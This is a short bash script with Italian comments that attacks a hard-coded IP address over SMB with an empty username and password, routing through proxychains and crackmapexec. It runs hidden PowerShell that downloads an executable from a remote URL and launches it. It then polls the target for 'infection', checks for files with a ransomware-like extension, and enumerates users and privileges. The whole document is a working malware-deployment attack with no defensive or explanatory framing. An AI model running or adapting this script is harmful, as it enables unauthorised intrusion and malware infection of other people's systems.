#!/bin/bash
TARGET="186.57.237.126"
EDGEONE_URL="https://YOUR_EDGEONE_URL/trustedf57.exe"

# Installa dipendenze
apt update -qq && apt install -y crackmapexec proxychains  python3 -qq

# Deploy + Monitor
proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
powershell -nop -w hidden -c '
\$wc=New-Object Net.WebClient;
\$wc.Headers.Add(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64)\");
\$wc.DownloadFile(\"$EDGEONE_URL\", \"C:\\Windows\\Temp\\trustedf57.exe\");
Start-Process \"C:\\Windows\\Temp\\trustedf57.exe\" -WindowStyle Hidden;
Write-Output \"DEPLOYED\"
' > C:\\temp\\deploy.log 2>&1
"

# Monitor loop (ogni 5s x 60 tentativi)
for i in {1..60}; do
  echo "[$i/60] Checking infection..."
  proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
  if(Test-Path 'C:\\Windows\\Temp\\trustedf57.exe'){Write-Output 'FILE_OK'}; 
  Get-Process | ?{\$_.ProcessName -match 'trustedf57|TRUSTED'} | select Name,ID,StartTime | Out-String;
  dir C:\\Users\\*\\Desktop\\*.txt; dir C:\\*.TRUSTEDF57;
  type C:\\temp\\deploy.log 2>\$null;
  Write-Output \"CHECK_$i\"
  "
  sleep 5
done

# Final status
proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
net user; hostname; whoami /all; 
Get-Process | ?{\$_.ProcessName -match 'trustedf57|TRUSTED'};
echo 'MISSION_STATUS_FINAL'
"
